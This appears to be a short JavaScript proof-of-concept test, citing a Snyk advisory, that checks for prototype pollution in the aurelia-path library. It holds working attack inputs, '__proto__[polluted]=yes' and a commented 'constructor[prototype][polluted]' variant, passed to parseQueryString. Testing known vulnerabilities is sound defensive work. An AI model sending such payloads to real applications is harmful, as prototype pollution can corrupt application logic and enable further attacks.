// //https://security.snyk.io/vuln/SNYK-JS-AURELIAPATH-1292346
// test("prototype pollution in aurelia-path", () => {
const ap = require("aurelia-path");
console.log({}.polluted);
ap.parseQueryString("__proto__[polluted]=yes");
//ap.parseQueryString("constructor[prototype][polluted]=yes");
console.log({}.polluted);
// });
